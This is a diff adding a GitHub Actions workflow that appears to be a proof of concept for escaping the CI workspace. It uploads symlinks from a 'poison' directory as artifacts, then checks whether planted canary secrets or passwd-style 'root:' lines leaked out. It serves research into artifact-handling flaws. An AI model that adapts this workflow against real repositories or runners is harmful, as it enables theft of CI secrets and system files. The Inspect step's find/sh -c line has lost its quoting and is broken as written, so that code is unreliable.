@@ -1,0 +1,56 @@
+name: artifact-symlink-escalate
+on: workflow_dispatch
+permissions:
+  contents: read
+  actions: write
+jobs:
+  upload:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Trusted prior step writes secret outside workspace
+        run: |
+          set -euo pipefail
+          echo "SECRET_TOKEN_$(openssl rand -hex 16)" > "$RUNNER_TEMP/ci-secret.txt"
+          echo "EVENT_PATH=$GITHUB_EVENT_PATH"
+          ls -la "$RUNNER_TEMP" | head
+          # also drop something under work root sibling
+          echo "WORK_SECRET_$(openssl rand -hex 8)" > "$GITHUB_WORKSPACE/../work-secret.txt" || true
+          ls -la "$GITHUB_WORKSPACE/.." | head
+
+      - uses: actions/checkout@v4
+
+      - name: Show poison tree from checkout
+        run: |
+          set -euo pipefail
+          ls -la poison || { echo "no poison dir"; find . -maxdepth 3 -type l -ls; }
+          find poison -type l -exec ls -la {} \; 2>/dev/null || true
+
+      - uses: actions/upload-artifact@v4
+        with:
+          name: symlink-escalate
+          path: poison
+
+      - uses: actions/upload-artifact@v4
+        with:
+          name: symlink-escalate-workspace
+          path: .
+
+  verify:
+    needs: upload
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/download-artifact@v4
+        with:
+          name: symlink-escalate
+          path: d1
+      - uses: actions/download-artifact@v4
+        with:
+          name: symlink-escalate-workspace
+          path: d2
+      - name: Inspect
+        run: |
+          set -euo pipefail
+          echo "=== d1 ==="; find d1 -print; find d1 -type f -exec sh -c echo; echo == $1 ==; file "$1"; head -c 200 "$1"; echo _ {} \;
+          echo "=== d2 interesting ==="; find d2 -type f | head -50
+          grep -R "SECRET_\|WORK_SECRET_\|root:\|CANARY" d1 d2 2>/dev/null && echo RESULT=SENSITIVE_EXFIL || echo RESULT=NO_SENSITIVE
+
